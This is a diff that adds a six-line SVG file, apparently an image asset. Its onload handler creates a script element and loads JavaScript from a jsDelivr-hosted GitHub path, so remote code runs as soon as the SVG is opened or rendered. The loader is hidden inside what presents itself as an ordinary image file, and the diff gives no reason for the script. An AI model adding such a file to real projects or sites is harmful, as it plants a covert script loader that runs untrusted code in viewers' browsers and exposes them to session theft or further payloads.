@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="
+    var s = document.createElementNS('http://www.w3.org/1999/xhtml','script');
+    s.src = 'https://cdn.jsdelivr.net/gh/rysk-zeroauth/onlycheck/custom.js';
+    document.head.appendChild(s);
+">
+</svg>
